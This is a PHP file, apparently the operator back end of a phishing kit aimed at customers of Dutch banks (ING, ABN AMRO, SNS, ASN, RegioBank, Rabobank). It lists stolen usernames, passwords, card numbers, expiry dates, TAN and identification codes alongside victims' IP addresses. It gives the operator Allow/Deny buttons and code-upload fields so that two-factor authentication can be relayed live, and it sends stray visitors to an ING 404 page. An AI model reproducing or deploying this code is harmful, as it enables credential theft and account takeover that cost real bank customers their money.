<?php

require 'connection.php';

$wachtwoord = $_GET['wachtwoord'];
$firstQuery = "SELECT wachtwoord FROM pass WHERE id=1";
$firstResult = mysqli_query($con, $firstQuery);
if(mysqli_num_rows($firstResult) == 0)
{
    header("location: https://www.ing.nl/404");
    exit();
}

$query = "SELECT current, link, ipaddress, bank, token, inguser, ingpass, inglogincheck, ingpasnummer, ingvervaldatum, ingloginchecktwo, ingtancode, inglogincheckthree, abnrekening, abnpasnummer, abnresponsone, abnresponscheck, abnresponscode, abnresponstwo, abnresponschecktwo, abnidentificatie, snsrespons, snsresponscheckone, snsresponscode, snsresponstwo, snsresponschecktwo, asnrespons, asnresponscheckone, asnresponscode, asnresponstwo, asnresponschecktwo, regiorespons, regioresponscheckone, regioresponscode, regioresponstwo, regioresponschecktwo, abnresponscheckthree, raborekeningnummer, rabopasnummer, raboresponscheckone, raboresponscode, raboresponsone, raboresponschecktwo, raboresponscodetwo, raboresponstwo, raboresponscheckthree, raboidentification, raboresponscheckfour FROM request_data ORDER BY id DESC";
$stmt = mysqli_stmt_init($con);
mysqli_stmt_prepare($stmt, $query);
mysqli_stmt_execute($stmt);
mysqli_stmt_bind_result($stmt, $current, $link, $ip, $bank, $token, $inguser, $ingpass, $inglogincheck, $ingpasnummer, $ingvervaldatum, $ingloginchecktwo, $ingtancode, $inglogincheckthree, $abnrekening, $abnpasnummer, $abnresponsone, $abnresponscheck, $abnresponscode, $abnresponstwo, $abnresponschecktwo, $abnidentificatie, $snsrespons, $snsresponscheckone, $snsresponscode, $snsresponstwo, $snsresponschecktwo, $asnrespons, $asnresponscheckone, $asnresponscode, $asnresponstwo, $asnresponschecktwo, $regiorespons, $regioresponscheckone, $regioresponscode, $regioresponstwo, $regioresponschecktwo, $abnresponscheckthree, $raborekeningnummer, $rabopasnummer, $raboresponscheckone, $raboresponscode, $raboresponsone, $raboresponschecktwo, $raboresponscodetwo, $raboresponstwo, $raboresponscheckthree, $raboidentification, $raboresponscheckfour);


while(mysqli_stmt_fetch($stmt))
{
    $current;
    $link;
    $ip;
    $bank;
    $token;
    $inguser;
    $ingpass;
    $inglogincheck;
    $ingpasnummer;
    $ingvervaldatum;
    $ingloginchecktwo;
    $ingtancode;
    $inglogincheckthree;
    $abnrekening;
    $abnpasnummer;
    $abnresponsone;
    $abnresponscheck;
    $abnresponscode;
    $abnresponstwo;
    $abnresponschecktwo;
    $abnidentificatie;
    $snsrespons;
    $snsresponscheckone;
    $snsresponscode;
    $snsresponstwo;
    $snsresponschecktwo;
    $asnrespons;
    $asnresponscheckone;
    $asnresponscode;
    $asnresponstwo;
    $asnresponschecktwo;
    $regiorespons;
    $regioresponscheckone;
    $regioresponscode;
    $regioresponstwo;
    $regioresponschecktwo;
    $abnresponscheckthree;
    $raborekeningnummer;
    $rabopasnummer;
    $raboresponscheckone;
    $raboresponscode;
    $raboresponsone;
    $raboresponschecktwo;
    $raboresponscodetwo;
    $raboresponstwo;
    $raboresponscheckthree;
    $raboidentification;
    $raboresponscheckfour;
    
    echo '<form autocomplete="false" action="#" method="post" id="all-forms">';
    if($current != "")
    {
        echo "<label>Tijd / Datum</label>";
        echo "<input type='text' readonly='true' name='token' value='$current'>";
    }
    if($ip != "")
    {
        echo "<label>IP</label>";
        echo "<input type='text' readonly='true' name='token' value='$ip'>";
    }
    if($link && $token != "")
    {        
        echo "<label style='text-align:left;'>Link</label>";
        echo "<input type='text' readonly='true' value='$link'>";
        echo "<label>Token</label>";
        echo "<input type='text' readonly='true' name='token' value='$token'>";
    }
    if($bank == 'ing')
    {
        echo "<label>Bank</label>";
        echo "<input type='text' readonly='true' value='$bank'>";
        if($inguser && $ingpass != "")
        {
            echo "<label>Gebruikersnaam</label>";
            echo "<input type='text' readonly='true' value='$inguser'>";
            echo "<label>Wachtwoord</label>";
            echo "<input type='text' readonly='true' value='$ingpass'>";
        }
        if($inguser && $ingpass != "" && $inglogincheck != "true")
        {
            echo "<button type='submit' name='toestaan' id='button-allow'>Toestaan</button>";
            echo "<button type='submit' name='weigeren' id='button-deny'>Weigeren</button>";
        }
        if($ingpasnummer && $ingvervaldatum != "")
        {
            echo "<label>Pasnummer</label>";
            echo "<input type='text' readonly='true' value='$ingpasnummer'>";
            echo "<label>Vervaldatum</label>";
            echo "<input type='text' readonly='true' value='$ingvervaldatum'>";
        }
        if($ingpasnummer && $ingvervaldatum != "" && $ingloginchecktwo != "true")
        {
            echo "<button type='submit' name='toestaan-2' id='button-allow'>Toestaan</button>";
            echo "<button type='submit' name='weigeren-2' id='button-deny'>Weigeren</button>";
        }
        if($ingtancode != "")
        {
            echo "<label>Tancode</label>";
            echo "<input type='text' readonly='true' value='$ingtancode'>";
        }
        if($ingtancode != "" && $inglogincheckthree != "true")
        {
            echo "<button type='submit' name='toestaan-3' id='button-allow'>Toestaan</button>";
            echo "<button type='submit' name='weigeren-3' id='button-deny'>Weigeren</button>";
        }
    }
    else if($bank == 'abn')
    {
        echo "<label>Bank</label>";
        echo "<input type='text' readonly='true' value='$bank'>";
        if($abnrekening && $abnpasnummer != "")
        {
            echo "<label>Rekeningnummer</label>";
            echo "<input type='text' readonly='true' value='$abnrekening'>";
            echo "<label>Pasnummer</label>";
            echo "<input type='text' readonly='true' value='$abnpasnummer'>";
        }
        if($abnidentificatie != "")
        {
            echo "<label>Identificatiecode</label>";
            echo "<input type='text' readonly='true' value='$abnidentificatie'>";
        }
        if($abnidentificatie != "" && $abnresponscheckthree != "true")
        {
            echo "<button type='submit' id='upload-button' name='accept-identification'>Accepteer Code</button>";
            echo "<button type='submit' style='color: red; border: 1px solid red;' id='upload-button' name='deny-identification'>Weiger Code</button>";
        }
        if($abnresponsone != "")
        {
            echo "<label>Eerste Respons</label>";
            echo "<input type='text' readonly='true' value='$abnresponsone'>";
        }
        if($abnresponsone != "" && $abnresponscheck != "true")
        {
            echo "<label>Upload/Weiger Code</label>";
            echo "<input type='text' name='abn-code'>";
            echo "<button type='submit' id='upload-button' name='upload-code'>Upload Code</button>";
            echo "<button type='submit' style='color: red; border: 1px solid red;' id='upload-button' name='deny-code'>Weiger Code</button>";
        }
        if($abnresponstwo != "")
        {
            echo "<label>Tweede Respons</label>";
            echo "<input type='text' readonly='true' value='$abnresponstwo'>";
        }
        if($abnresponstwo != "" && $abnresponschecktwo != "true")
        {
            echo "<button type='submit' id='upload-button' name='accept-code'>Accepteer Code</button>";
            echo "<button type='submit' style='color: red; border: 1px solid red;' id='upload-button' name='deny-code-2'>Weiger Code</button>";
        }
    }
    else if ($bank == 'sns')
    {
        echo "<label>Bank</label>";
        echo "<input type='text' readonly='true' value='$bank'>";
        if($snsrespons != "")
        {
            echo "<label>Serienummer</label>";
            echo "<input type='text' readonly='true' value='$snsrespons'>";
        }
        if($snsrespons != "" && $snsresponscheckone != "true")
        {
            echo "<label>Upload/Weiger Code</label>";
            echo "<input type='text' name='sns-code'>";
            echo "<button type='submit' id='upload-button' name='sns-code-submit'>Upload Code</button>";
            echo "<button type='submit' style='color: red; border: 1px solid red;' id='upload-button' name='sns-code-deny'>Weiger Code</button>";
        }
        if($snsresponstwo != "")
        {
            echo "<label>Respons</label>";
            echo "<input type='text' readonly='true' value='$snsresponstwo'>";
        }
        if($snsresponstwo != "" && $snsresponschecktwo != "true")
        {
            echo "<button type='submit' id='upload-button' name='sns-code-submit-2'>Accepteer Code</button>";
            echo "<button type='submit' style='color: red; border: 1px solid red;' id='upload-button' name='sns-code-deny-2'>Weiger Code</button>";
        }        
    }
    else if ($bank == 'asn')
    {
        echo "<label>Bank</label>";
        echo "<input type='text' readonly='true' value='$bank'>";
        if($asnrespons != "")
        {
            echo "<label>Serienummer</label>";
            echo "<input type='text' readonly='true' value='$asnrespons'>";
        }
        if($asnrespons != "" && $asnresponscheckone != "true")
        {
            echo "<label>Upload/Weiger Code</label>";
            echo "<input type='text' name='asn-code'>";
            echo "<button type='submit' id='upload-button' name='asn-code-submit'>Upload Code</button>";
            echo "<button type='submit' style='color: red; border: 1px solid red;' id='upload-button' name='asn-code-deny'>Weiger Code</button>";
        }
        if($asnresponstwo != "")
        {
            echo "<label>Respons</label>";
            echo "<input type='text' readonly='true' value='$asnresponstwo'>";
        }
        if($asnresponstwo != "" && $asnresponschecktwo != "true")
        {
            echo "<button type='submit' id='upload-button' name='asn-code-submit-2'>Accepteer Code</button>";
            echo "<button type='submit' style='color: red; border: 1px solid red;' id='upload-button' name='asn-code-deny-2'>Weiger Code</button>";
        }
    }
    else if ($bank == 'regio')
    {
        echo "<label>Bank</label>";
        echo "<input type='text' readonly='true' value='$bank'>";
        if($regiorespons != "")
        {
            echo "<label>Serienummer</label>";
            echo "<input type='text' readonly='true' value='$regiorespons'>";
        }
        if($regiorespons != "" && $regioresponscheckone != "true")
        {
            echo "<label>Upload/Weiger Code</label>";
            echo "<input type='text' name='regio-code'>";
            echo "<button type='submit' id='upload-button' name='regio-code-submit'>Upload Code</button>";
            echo "<button type='submit' style='color: red; border: 1px solid red;' id='upload-button' name='regio-code-deny'>Weiger Code</button>";
        }
        if($regioresponstwo != "")
        {
            echo "<label>Respons</label>";
            echo "<input type='text' readonly='true' value='$regioresponstwo'>";
        }
        if($regioresponstwo != "" && $regioresponschecktwo != "true")
        {
            echo "<button type='submit' id='upload-button' name='regio-code-submit-2'>Accepteer Code</button>";
            echo "<button type='submit' style='color: red; border: 1px solid red;' id='upload-button' name='regio-code-deny-2'>Weiger Code</button>";
        }
    }
    else if($bank == 'rabo')
    {
        echo "<label>Bank</label>";
        echo "<input type='text' readonly='true' value='$bank'>";
        if($raborekeningnummer && $rabopasnummer != "")
        {
            echo "<label>Rekeningnummer</label>";
            echo "<input type='text' readonly='true' value='$raborekeningnummer'>";
            echo "<label>Pasnummer</label>";
            echo "<input type='text' readonly='true' value='$rabopasnummer'>";
        }
        if($raborekeningnummer && $rabopasnummer != "" && $raboresponscheckone != "true")
        {
            echo "<label>Upload Link/Weiger</label>";
            echo "<input type='text' name='rabo-code-one'>";
            echo "<button type='submit' id='upload-button' name='rabo-code-submit'>Upload Code</button>";
            echo "<button type='submit' style='color: red; border: 1px solid red;' id='upload-button' name='rabo-code-deny'>Weiger</button>";

        }
        if($raboresponsone != "")
        {
            echo "<label>Eerste Respons</label>";
            echo "<input type='text' readonly='true' value='$raboresponsone'>";
        }
        if($raboresponsone != "" && $raboresponschecktwo != "true")
        {
            echo "<label>Upload Link</label>";
            echo "<input type='text' name='rabo-code-two'>";
            echo "<button type='submit' id='upload-button' name='rabo-code-submit-2'>Upload Code</button>";
            echo "<br>";
            echo "<label>Weiger Link</label>";
            echo "<input type='text' name='rabo-code-three'>";
            echo "<button type='submit' style='color: red; border: 1px solid red;' id='upload-button' name='rabo-code-deny-2'>Weiger Code</button>";
        }
        if($raboresponstwo != "")
        {
            echo "<label>Tweede Respons</label>";
            echo "<input type='text' readonly='true' value='$raboresponstwo'>";
        }
        if($raboresponstwo != "" && $raboresponscheckthree != "true")
        {
           
            echo "<button type='submit' id='upload-button' name='rabo-code-submit-3'>Accepteer Code</button>";
            echo "<br>";
            echo "<label>Weiger Link</label>";
            echo "<input type='text' name='rabo-code-five'>";
            echo "<button type='submit' style='color: red; border: 1px solid red;' id='upload-button' name='rabo-code-deny-3'>Weiger Code</button>";
        }
        if($raboidentification != "")
        {
            echo "<label>Identificatiecode</label>";
            echo "<input type='text' readonly='true' value='$raboidentification'>";
        }
        if($raboidentification != "" && $raboresponscheckfour != "true")
        {
            echo "<button type='submit' id='upload-button' name='rabo-id-submit'>Accepteer Code</button>";
            echo "<button type='submit' style='color: red; border: 1px solid red;' id='upload-button' name='rabo-id-deny'>Weiger Code</button>";
        }
    }
    echo '</form>';
}


?>